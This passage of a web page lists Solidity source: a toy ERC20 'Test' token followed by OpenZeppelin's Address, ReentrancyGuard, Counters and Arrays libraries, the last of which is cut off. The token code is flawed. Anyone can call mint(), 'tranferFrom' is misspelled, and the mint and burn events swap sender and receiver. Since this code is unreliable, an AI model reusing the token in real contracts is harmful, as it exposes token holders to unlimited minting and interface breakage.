class="line"></span><br><span class="line">    function <span class="title function_">allowance</span><span class="params">(address owner, address spender)</span> external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">tranferFrom</span><span class="params">(address sender, address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    event <span class="title function_">Transfer</span><span class="params">(address indexed from, address indexed to, uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Approve</span><span class="params">(address indexed owner, address indexed spender, uint amount)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ERC20 is IERC20&#123;</span><br><span class="line">    uint public totalSupply;</span><br><span class="line">    mapping(address=&gt;uint) public balanceOf;</span><br><span class="line">    mapping(address=&gt;mapping(address=&gt;uint)) public allowance;</span><br><span class="line">    <span class="built_in">string</span> public name= <span class="string">&quot;Test&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> public symbol=<span class="string">&quot;TEST&quot;</span>;</span><br><span class="line">    uint8 public decimals=<span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        balanceOf[recipient] += amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender, recipient,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        allowance[msg.sender][spender]= amount;</span><br><span class="line">        emit <span class="title function_">Approve</span><span class="params">(msg.sender,spender,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">tranferFrom</span><span class="params">(address sender, address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        allowance[sender][msg.sender] -= amount;</span><br><span class="line">        balanceOf[sender] -= amount;</span><br><span class="line">        balanceOf[recipient] += amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(sender,recipient,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">mint</span><span class="params">(uint amount)</span> external &#123;</span><br><span class="line">        balanceOf[msg.sender] += amount;</span><br><span class="line">        totalSupply += amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender, address(<span class="number">0</span>),amount)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">burn</span><span class="params">(uint amount)</span> external &#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        totalSupply -= amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(address(<span class="number">0</span>),msg.sender,amount)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Address-sol"><a href="#Address-sol" class="headerlink" title="Address.sol"></a>Address.sol</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">library Address &#123;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isContract</span><span class="params">(address account)</span> internal view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="keyword">return</span> account.code.length &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">sendValue</span><span class="params">(address payable recipient, uint256 amount)</span> internal &#123;</span><br><span class="line">        require(address(this).balance &gt;= amount, <span class="string">&quot;Address: insufficient balance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        (<span class="type">bool</span> success, ) = recipient.call&#123;value: amount&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        require(success, <span class="string">&quot;Address: unable to send value, recipient may have reverted&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">functionCall</span><span class="params">(address target, bytes memory data)</span> internal <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> functionCallWithValue(target, data, <span class="number">0</span>, <span class="string">&quot;Address: low-level call failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    function <span class="title function_">functionCall</span><span class="params">(</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        bytes memory data,</span></span><br><span class="line"><span class="params">        <span class="built_in">string</span> memory errorMessage</span></span><br><span class="line"><span class="params">    )</span> internal <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> functionCallWithValue(target, data, <span class="number">0</span>, errorMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    function <span class="title function_">functionCallWithValue</span><span class="params">(address target, bytes memory data, uint256 value)</span> internal <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> functionCallWithValue(target, data, value, <span class="string">&quot;Address: low-level call with value failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">functionCallWithValue</span><span class="params">(</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        bytes memory data,</span></span><br><span class="line"><span class="params">        uint256 value,</span></span><br><span class="line"><span class="params">        <span class="built_in">string</span> memory errorMessage</span></span><br><span class="line"><span class="params">    )</span> internal <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        require(address(this).balance &gt;= value, <span class="string">&quot;Address: insufficient balance for call&quot;</span>);</span><br><span class="line">        (<span class="type">bool</span> success, bytes memory returndata) = target.call&#123;value: value&#125;(data);</span><br><span class="line">        <span class="keyword">return</span> verifyCallResultFromTarget(target, success, returndata, errorMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Same as &#123;xref-Address-functionCall-address-bytes-&#125;[`functionCall`],</span></span><br><span class="line"><span class="comment">     * but performing a static call.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v3.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">functionStaticCall</span><span class="params">(address target, bytes memory data)</span> internal view <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> functionStaticCall(target, data, <span class="string">&quot;Address: low-level static call failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    function <span class="title function_">functionStaticCall</span><span class="params">(</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        bytes memory data,</span></span><br><span class="line"><span class="params">        <span class="built_in">string</span> memory errorMessage</span></span><br><span class="line"><span class="params">    )</span> internal view <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        (<span class="type">bool</span> success, bytes memory returndata) = target.staticcall(data);</span><br><span class="line">        <span class="keyword">return</span> verifyCallResultFromTarget(target, success, returndata, errorMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    function <span class="title function_">functionDelegateCall</span><span class="params">(address target, bytes memory data)</span> internal <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> functionDelegateCall(target, data, <span class="string">&quot;Address: low-level delegate call failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Same as &#123;xref-Address-functionCall-address-bytes-string-&#125;[`functionCall`],</span></span><br><span class="line"><span class="comment">     * but performing a delegate call.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v3.4._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">functionDelegateCall</span><span class="params">(</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        bytes memory data,</span></span><br><span class="line"><span class="params">        <span class="built_in">string</span> memory errorMessage</span></span><br><span class="line"><span class="params">    )</span> internal <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        (<span class="type">bool</span> success, bytes memory returndata) = target.delegatecall(data);</span><br><span class="line">        <span class="keyword">return</span> verifyCallResultFromTarget(target, success, returndata, errorMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling</span></span><br><span class="line"><span class="comment">     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.8._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">verifyCallResultFromTarget</span><span class="params">(</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        <span class="type">bool</span> success,</span></span><br><span class="line"><span class="params">        bytes memory returndata,</span></span><br><span class="line"><span class="params">        <span class="built_in">string</span> memory errorMessage</span></span><br><span class="line"><span class="params">    )</span> internal view <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (success) &#123;</span><br><span class="line">            <span class="keyword">if</span> (returndata.length == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// only check isContract if the call was successful and the return data is empty</span></span><br><span class="line">                <span class="comment">// otherwise we already know that it was a contract</span></span><br><span class="line">                require(isContract(target), <span class="string">&quot;Address: call to non-contract&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> returndata;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            _revert(returndata, errorMessage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Tool to verify that a low level call was successful, and revert if it wasn&#x27;t, either by bubbling the</span></span><br><span class="line"><span class="comment">     * revert reason or using the provided one.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">verifyCallResult</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">bool</span> success,</span></span><br><span class="line"><span class="params">        bytes memory returndata,</span></span><br><span class="line"><span class="params">        <span class="built_in">string</span> memory errorMessage</span></span><br><span class="line"><span class="params">    )</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (success) &#123;</span><br><span class="line">            <span class="keyword">return</span> returndata;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            _revert(returndata, errorMessage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _revert(bytes memory returndata, <span class="built_in">string</span> memory errorMessage) private pure &#123;</span><br><span class="line">        <span class="comment">// Look for revert reason and bubble it up if present</span></span><br><span class="line">        <span class="keyword">if</span> (returndata.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// The easiest way to bubble the revert reason is using memory via assembly</span></span><br><span class="line">            <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">            assembly &#123;</span><br><span class="line">                let returndata_size := mload(returndata)</span><br><span class="line">                revert(add(<span class="number">32</span>, returndata), returndata_size)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            revert(errorMessage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ReentrancyGuard-sol"><a href="#ReentrancyGuard-sol" class="headerlink" title="ReentrancyGuard.sol"></a>ReentrancyGuard.sol</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">abstract contract ReentrancyGuard &#123;</span><br><span class="line">    uint256 private constant _NOT_ENTERED = <span class="number">1</span>;</span><br><span class="line">    uint256 private constant _ENTERED = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    uint256 private _status;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    modifier <span class="title function_">nonReentrant</span><span class="params">()</span> &#123;</span><br><span class="line">        _nonReentrantBefore();</span><br><span class="line">        _;</span><br><span class="line">        _nonReentrantAfter();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _nonReentrantBefore() private &#123;</span><br><span class="line">        <span class="comment">// On the first call to nonReentrant, _status will be _NOT_ENTERED</span></span><br><span class="line">        require(_status != _ENTERED, <span class="string">&quot;ReentrancyGuard: reentrant call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Any calls to nonReentrant after this point will fail</span></span><br><span class="line">        _status = _ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _nonReentrantAfter() private &#123;</span><br><span class="line">        <span class="comment">// By storing the original value once again, a refund is triggered (see</span></span><br><span class="line">        <span class="comment">// https://eips.ethereum.org/EIPS/eip-2200)</span></span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    function _reentrancyGuardEntered() internal view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _status == _ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Counters-sol"><a href="#Counters-sol" class="headerlink" title="Counters.sol"></a>Counters.sol</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts v4.4.1 (utils/Counters.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title Counters</span></span><br><span class="line"><span class="comment"> * @author Matt Condon (@shrugs)</span></span><br><span class="line"><span class="comment"> * @dev Provides counters that can only be incremented, decremented or reset. This can be used e.g. to track the number</span></span><br><span class="line"><span class="comment"> * of elements in a mapping, issuing ERC721 ids, or counting request ids.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Include with `using Counters for Counters.Counter;`</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library Counters &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Counter</span> &#123;</span></span><br><span class="line">        <span class="comment">// This variable should never be directly accessed by users of the library: interactions must be restricted to</span></span><br><span class="line">        <span class="comment">// the library&#x27;s function. As of Solidity v0.5.2, this cannot be enforced, though there is a proposal to add</span></span><br><span class="line">        <span class="comment">// this feature: see https://github.com/ethereum/solidity/issues/4637</span></span><br><span class="line">        uint256 _value; <span class="comment">// default: 0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">current</span><span class="params">(Counter storage counter)</span> internal view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> counter._value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">increment</span><span class="params">(Counter storage counter)</span> internal &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            counter._value += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">decrement</span><span class="params">(Counter storage counter)</span> internal &#123;</span><br><span class="line">        uint256 value = counter._value;</span><br><span class="line">        require(value &gt; <span class="number">0</span>, <span class="string">&quot;Counter: decrement overflow&quot;</span>);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            counter._value = value - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">reset</span><span class="params">(Counter storage counter)</span> internal &#123;</span><br><span class="line">        counter._value = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Arrays-sol"><a href="#Arrays-sol" class="headerlink" title="Arrays.sol"></a>Arrays.sol</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.8.0) (utils/Arrays.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;./StorageSlot.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;./math/Math.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev Collection of functions related to array types.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library Arrays &#123;</span><br><span class="line">    using StorageSlot <span class="keyword">for</span> bytes32;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Searches a sorted `array` and returns the first index that contains</span></span><br><span class="line"><span class="comment">     * a value greater or equal to `element`. If no such index exists (i.e. all</span></span><br><span class="line"><span class="comment">     * values in the array are strictly less than `element`), the array length is</span></span><br><span class="line"><span class="comment">     * returned. Time complexity O(log n).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * `array` is expected to be sorted in ascending order, and to contain no</span></span><br><span class="line"><span class="comment">     * repeated elements.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">findUpperBound</span><span class="params">(uint256[] storage <span class="built_in">array</span>, uint256 element)</span> internal view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">array</span>.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 low = <span class="number">0</span>;</span><br><span class="line">        uint256 high = <span class="built_in">array</span>.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            uint256 mid = Math.average(low, high);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Note that mid will always be strictly less than high (i.e. it will be a valid array index)</span></span><br><span class="line">            <span class="comment">// because Math.average rounds down (it does integer division with truncation).</span></span><br><span class="line">            <span class="keyword">if</span> (unsafeAccess(<span class="built_in">array</span>, mid).value &gt; element) &#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// At this point `low` is the exclusive upper bound. We will return the inclusive upper bound.</span></span><br><span class="line">        <span class="keyword">if</span> (low &gt; <span class="number">0</span> &amp;&amp; unsafeAccess(<span class="built_in">array</span>, low - <span class="number">1</span>).value == element) &#123;</span><br><span class="line">            <span class="keyword">return</span> low - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> low;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Access an array in an &quot;unsafe&quot; way. Skips solidity &quot;index-out-of-range&quot; check.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * WARNING: Only use if you are certain `pos` is lower than the array length.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">unsafeAccess</span><span class="params">(address[] storage arr, uint256 pos)</span> internal pure <span class="title function_">returns</span> <span class="params">(StorageSlot.AddressSlot storage)</span> &#123;</span><br><span class="line">        bytes32 slot;</span><br><span class="line">        <span class="comment">// We use assembly to calculate the storage slot of the element at index `pos` of the dynamic array `arr`</span></span><br><span class="line">        <span class="comment">// following https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#mappings-and-dynamic-arrays.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(<span class="number">0</span>, arr.slot)</span><br><span class="line">            slot := 